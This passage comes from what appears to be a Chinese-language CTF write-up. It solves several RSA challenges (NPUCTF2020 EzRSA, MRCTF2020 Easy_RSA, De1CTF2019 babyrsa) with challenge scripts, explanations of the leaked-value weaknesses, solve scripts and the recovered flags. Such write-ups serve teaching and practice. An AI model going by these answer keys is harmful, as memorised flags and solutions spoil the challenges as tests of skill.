class="token punctuation">)</span><span class="token comment"># b'MRCTF&#123;sti11_@_b@by_qu3st10n&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NPUCTF2020-EzRSA"><a href="#NPUCTF2020-EzRSA" class="headerlink" title="[NPUCTF2020]EzRSA"></a>[NPUCTF2020]EzRSA</h4><p><strong>TAG：给出p-1、q-1的最小公倍数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> powmod<span class="token punctuation">,</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> mpz<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime<span class="token keyword">from</span> random <span class="token keyword">import</span> randintp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qgift <span class="token operator">=</span> lcm<span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">54722</span>flag <span class="token operator">=</span> <span class="token string">b'NPUCTF&#123;******************&#125;'</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> powmod<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n: '</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'gift: '</span><span class="token punctuation">,</span> gift<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c: '</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""n = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121gift = 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104c = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出的gift可以看到是非常接近于n的，而这个最小公倍数的最大值为<code>(p-1)*(q-1)</code>，是不可能比n更大的，所以这里我们可以尝试对<code>(p-1)*(q-1)</code>也就是<code>phi</code>进行爆破，下面写出解题脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> powmod<span class="token punctuation">,</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> mpz<span class="token punctuation">,</span> isqrt<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token triple-quoted-string string">"""p = getPrime(1024)q = getPrime(1024)n = p * qgift = lcm(p - 1, q - 1)e = 54722flag = b'NPUCTF&#123;******************&#125;'m = int.from_bytes(flag, 'big')c = powmod(m, e, n)print('n: ', n)print('gift: ', gift)print('c: ', c)"""</span>n <span class="token operator">=</span> <span class="token number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span>gift <span class="token operator">=</span> <span class="token number">2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span>c <span class="token operator">=</span> <span class="token number">3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span>e <span class="token operator">=</span> <span class="token number">54722</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>gift<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    phi <span class="token operator">=</span> gift <span class="token operator">*</span> i    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>isqrt<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token comment"># b'NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个范围<code>[4, 8]</code>的原因是gift是2045bit，phi是2048位。而phi = lcm <em> gcd，`乘积(2048)=最小公倍数(2045)</em>最大公约数(3)<code>。故gcd的值为三个比特位，即</code>[4, 8]`。</p><p>而e不是素数，无法求出invert，这里把<code>e//2</code>，再将<code>m开平方</code>即可。</p><h4 id="MRCTF2020-Easy-RSA"><a href="#MRCTF2020-Easy-RSA" class="headerlink" title="[MRCTF2020]Easy_RSA"></a>[MRCTF2020]Easy_RSA</h4><p>给出的加密脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> gcd<span class="token punctuation">,</span> invert<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime<span class="token punctuation">,</span> getRandomNBitInteger<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">import</span> base64<span class="token keyword">from</span> zlib <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">b"MRCTF&#123;XXXX&#125;"</span>base <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">gen_prime</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    A <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        A <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>N<span class="token punctuation">)</span>        <span class="token keyword">if</span> A <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_F_n = "</span><span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> q<span class="token punctuation">)</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_n = "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>    F_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> F_n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_E_D = "</span><span class="token punctuation">,</span> e <span class="token operator">*</span> d<span class="token punctuation">)</span>    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    _E <span class="token operator">=</span> base    _P <span class="token operator">=</span> gen_p<span class="token punctuation">(</span><span class="token punctuation">)</span>    _Q <span class="token operator">=</span> gen_q<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>_E<span class="token punctuation">,</span> <span class="token punctuation">(</span>_P <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>_Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    _M <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    _C <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>_M<span class="token punctuation">,</span> _E<span class="token punctuation">,</span> _P <span class="token operator">*</span> _Q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext = "</span><span class="token punctuation">,</span> _C<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''P_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693P_F_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740Q_n =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947Q_E_D =  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201Ciphertext =  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用到了有<code>e*d</code>和<code>n</code>求<code>phi</code>、有<code>phi</code>和<code>n</code>如何求<code>p、q</code>。注意，p和q的大小的问题。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesP_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span>P_F_n <span class="token operator">=</span>  <span class="token number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span>Q_n <span class="token operator">=</span>  <span class="token number">20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span>Q_E_D <span class="token operator">=</span>  <span class="token number">100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span>Ciphertext <span class="token operator">=</span>  <span class="token number">40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span>e <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">solve_p</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># =p-q</span>    q <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    p <span class="token operator">=</span> n <span class="token operator">//</span> q    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve_q</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># =p-q</span>    q <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    p <span class="token operator">=</span> n <span class="token operator">//</span> q    factor2 <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">-</span> <span class="token number">2020</span> <span class="token operator">*</span> q    <span class="token keyword">if</span> factor2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        factor2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>p <span class="token operator">=</span> solve_p<span class="token punctuation">(</span>P_n<span class="token punctuation">,</span> P_F_n<span class="token punctuation">)</span>K <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Q_E_D <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> Q_n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>phiq <span class="token operator">=</span> <span class="token punctuation">(</span>Q_E_D <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> Kq <span class="token operator">=</span> solve_q<span class="token punctuation">(</span>Q_n<span class="token punctuation">,</span> phiq<span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>Ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'MRCTF&#123;Ju3t_@_31mp13_que3t10n&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="De1CTF2019-babyrsa"><a href="#De1CTF2019-babyrsa" class="headerlink" title="[De1CTF2019]babyrsa"></a>[De1CTF2019]babyrsa</h4><p><strong>TAG: 复杂rsa的典范、中国剩余定理求解、小指数攻击</strong></p><p>这里</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">from</span> data <span class="token keyword">import</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q1p<span class="token punctuation">,</span> q1q<span class="token punctuation">,</span> hint<span class="token punctuation">,</span> flagn <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span><span class="token punctuation">,</span>    <span class="token number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span><span class="token punctuation">,</span>    <span class="token number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span><span class="token punctuation">,</span>    <span class="token number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span><span class="token punctuation">,</span>    <span class="token number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span><span class="token punctuation">,</span>    <span class="token 